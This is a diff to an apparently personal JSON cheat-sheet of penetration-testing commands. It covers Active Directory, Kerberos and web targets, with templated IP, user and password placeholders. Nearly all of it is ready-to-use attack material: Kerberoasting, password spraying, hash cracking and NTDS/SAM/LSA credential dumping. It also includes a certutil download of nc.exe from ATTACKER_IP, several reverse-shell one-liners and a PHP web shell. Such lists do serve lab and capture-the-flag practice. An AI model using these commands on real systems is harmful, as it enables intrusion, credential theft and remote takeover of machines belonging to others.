@@ -2,33 +2,43 @@
   "Active Directory": {
     "enumeration": [
       "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
+      "echo '{{IP}} {{DC.DOMAIN}} {{DOMAIN}}' >> /etc/hosts",
       "smbclient -L //{{IP}} -U {{USER}}",
       "impacket-lookupsid {{DOMAIN}}/{{USER}}@{{IP}}",
-      "enum4linux {{IP}}",
-      "enum4linux-ng {{IP}}",
-      "ftp -a {{IP}}",
-      "ftp {{USER}}@{{IP}}",	
+      "netexec smb {{IP}} --generate-krb5-file filename.conf",	
       "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --rid-brute",
       "netexec smb {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --shares",
-      "netexec smb {{IP}} -u {{USER}} -p '{{PASSWORD}}' --pass-pol'",
+      "netexec smb {{IP}} -u {{USER}} -p '{{PASSWORD}}' --pass-pol",
+      "netexec ldap {{IP}} -u '{{USER}}' -p '{{PASSWORD}}' --users",
       "bloodhound-python -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' -ns {{IP}} -c all",
       "kerbrute userenum --dc {{IP}} -d {{DOMAIN}} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
-      "certipy-ad find -u {{USER}} -p '{{PASSWORD}}' -dn {{DOMAIN}} -dc-ip {{IP}} -vulnerable"
+      "rpcclient -U \"\" -N {{IP}}",
+      "certipy-ad find -u {{USER}} -p '{{PASSWORD}}' -dn {{DOMAIN}} -dc-ip {{IP}} -vulnerable",
+      "enum4linux {{IP}}",
+      "enum4linux-ng {{IP}}",
+      "ssh {{USER}}@{{IP}}",
+      "ssh {{USER}}@{{IP}} -i id_rsa",
+      "ftp -a {{IP}}",
+      "ftp {{USER}}@{{IP}}"
     ],
     "exploitation": [
       "impacket-GetNPUsers {{DOMAIN}}/ -no-pass -usersfile users.txt -dc-ip {{IP}} -format john",
       "impacket-GetUserSPNs -dc-ip {{IP}} {{DOMAIN}}/{{USER}}:'{{PASSWORD}}' -request",
+      "impacket-getTGT {{DOMAIN}}/'{{USER}}':'{{PASSWORD}}' -dc-ip {{IP}}",
       "john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt",
       "netexec smb {{IP}} -u {{USER}} -p password.txt --continue-on-succes",
-      "python3 targetedKerberoast.py -v -d {{DOMAIN}} -u {{USER}} -p '{{PASSOWRD}}' --request-user TARGET_USER",
-      "rlwrap -cAr nc -nlvp {{PORT}}",
-      "xfreerdp3 /u:{{USER}} /p:'{{PASSWORD}}' /v:{{IP}}"                              
+      "netexec smb {{IP}} -u users.txt -p '{{PASSWORD}}' --continue-on-succes",
+      "python3 targetedKerberoast.py -v -d {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}' --request-user TARGET_USER",
+      "rlwrap -cAr nc -nlvp {{PORT}}"                            
     ],
+    
     "post-exploitation": [
       "evil-winrm -i {{DOMAIN}} -u {{USER}} -p '{{PASSWORD}}'",
+      "xfreerdp3 /u:{{USER}} /p:'{{PASSWORD}}' /v:{{IP}}",  
       "impacket-mssqlclient {{USER}}@{{IP}} -windows-auth",
       "impacket-psexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
       "impacket-secretsdump {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
+      "impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL",
       "impacket-wmiexec {{DOMAIN}}/{{USER}}:'{{PASSWORD}}'@{{IP}}",
       "python3 gMSADumper.py -u {{USER}} -p '{{PASSWORD}}' -d {{DOMAIN}}",
       "netexec smb {{IP}} --local-auth -u {{USER}} -p '{{PASSWORD}}' --sam",
@@ -37,6 +47,54 @@
       "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
     ]
   },
+    "KERBEROS": {
+    "enumeration": [
+      "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
+      "echo '{{IP}} {{DC.DOMAIN}} {{DOMAIN}}' >> /etc/hosts",
+      "netexec smb {{DOMAIN}} -k -u {{USER}} --generate-krb5-file filename.conf",
+      "impacket-getTGT {{DOMAIN}}/'{{USER}}':'{{PASSWORD}}' -dc-ip {{IP}}",
+      "export KRB5CCNAME=\"$PWD/{{USER}}.ccache\"",
+      "bloodhound-python -d {{DOMAIN}} -u {{USER}} -ns {{IP}} -c all -k -no-pass",
+      "netexec smb {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --users",
+      "netexec smb {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --shares",
+      "netexec smb {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --pass-pol",
+      "netexec smb {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --rid-brute",
+      "netexec ldap {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --users",
+      "impacket-smbclient -k '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}' -no-pass",
+      "impacket-lookupsid -k -no-pass {{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}",
+      "kerbrute userenum --dc {{IP}} -d {{DOMAIN}} /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt",
+      "certipy-ad find -k -no-pass -u {{USER}}@{{DOMAIN}} -target {{DC.DOMAIN}} -dc-host {{DC.DOMAIN}} -dc-ip {{IP}} -vulnerable",
+      "enum4linux {{IP}}",
+      "enum4linux-ng {{IP}}",
+      "ssh {{USER}}@{{IP}}",
+      "ssh {{USER}}@{{IP}} -i id_rsa",
+      "ftp -a {{IP}}",
+      "ftp {{USER}}@{{IP}}"
+    ],
+    "exploitation": [
+      "impacket-GetNPUsers {{DOMAIN}}/ -no-pass -usersfile users.txt -dc-ip {{IP}} -format john",
+      "impacket-GetUserSPNs -dc-host {{DC.DOMAIN}} -k -no-pass {{DOMAIN}}/{{USER}} -request",
+      "nxc smb {{DC.DOMAIN}} -u {{USER}}  -M timeroast -k",
+      "impacket-getTGT {{DOMAIN}}/'{{USER}}':'{{PASSWORD}}' -dc-ip {{IP}}",
+      "john hash --wordlist=/usr/share/wordlists/rockyou.txt",
+      "python3 targetedKerberoast.py -k --dc-host {{DC.DOMAIN}} -u {{USER}} -d {{DOMAIN}}",
+      "rlwrap -cAr nc -nlvp {{PORT}}",
+      "./username-anarchy --input-file users.txt --select-format first,firstlast,first.last,firstlast[8],first[4]last[4],firstl,f.last,flast,lfirst,l.first,lastf,last,last.f,last.first,FLast,first1,fl,fmlast,firstmiddlelast,fml,FL,FirstLast,First.Last,Last > anarchy_users.txt"                              
+    ],
+    
+    "post-exploitation": [
+      "evil-winrm -i {{DC.DOMAIN}} -K -u {{USER}} -R {{DOMAIN}}",
+      "impacket-mssqlclient -K '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}' -no-pass",
+      "impacket-psexec -k -no-pass '{{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}'",
+      "impacket-secretsdump -k -no-pass {{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}",
+      "impacket-secretsdump -system SYSTEM -ntds ntds.dit LOCAL",
+      "impacket-wmiexec -k -no-pass {{DOMAIN}}/{{USER}}@{{DC.DOMAIN}}",
+      "netexec smb {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --sam",
+      "netexec smb {{DC.DOMAIN}} -d {{DOMAIN}} --use-kcache --lsa",
+      "certipy-ad auth -pfx administrator.pfx -ldap-shell -dc-ip {{IP}}"
+    ]
+  },
+  
   "web": {
     "enumeration": [
       "nmap -p- --open -sS --min-rate 5000 -n -Pn {{IP}} -vvv",
@@ -52,12 +110,27 @@
       "python3 git_dumper.py {{URL}} git_dump"
     ]
   },
+  "usefull": {
+    "shell": [
+      "wget {{URL}}/pspy",
+      "wget {{URL}}/linpeas.sh",
+      "certutil.exe -urlcache -f http://ATTACKER_IP/nc.exe nc.exe",
+      "find / -perm -4000 2>/dev/null",
+      "grep -r --color=always 'password' . ",
+      "getcap -r / 2>/dev/null",
+      "python -c 'import pty; pty.spawn(\"/bin/bash\")'",
+      "script /dev/null -c /bin/bash",
+      "stty raw -echo; fg"
+    ]
+  },
   "revshell": {
     "shell": [
       "bash -i >& /dev/tcp/{{IP}}/{{PORT}} 0>&1",
+      "nc.exe {{IP}} {{PORT}} -e cmd",
       "nc -e /bin/bash {{IP}} {{PORT}}",
       "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{{IP}}\",{{PORT}}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
-      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} {{PORT}} >/tmp/f"
+      "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {{IP}} {{PORT}} >/tmp/f",
+      "<?php system($_GET[\"cmd\"]);?>"
     ]
   }
 }
